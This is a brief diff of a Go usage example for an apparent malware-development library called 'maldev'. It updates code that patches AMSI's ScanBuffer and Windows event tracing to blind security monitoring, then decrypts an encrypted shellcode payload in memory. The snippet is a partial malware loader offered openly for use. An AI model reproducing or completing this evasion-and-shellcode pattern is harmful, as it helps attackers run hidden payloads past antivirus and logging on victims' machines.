@@ -184,9 +184,7 @@ package main
 
 import (
     "context"
-    "unsafe"
 
-    "golang.org/x/sys/windows"
 
     "github.com/oioio-space/maldev/cleanup/memory"
     "github.com/oioio-space/maldev/crypto"
@@ -211,7 +209,7 @@ func main() {
     defer caller.Close()
 
     // 2. Apply evasion
-    evasion.ApplyAll(caller, amsi.Technique(), etw.Technique())
+    evasion.ApplyAll([]evasion.Technique{amsi.ScanBufferPatch(), etw.All()}, caller)
 
     // 3. Decrypt payload in memory
     shellcode, err := crypto.DecryptAESGCM(aesKey, encryptedPayload)
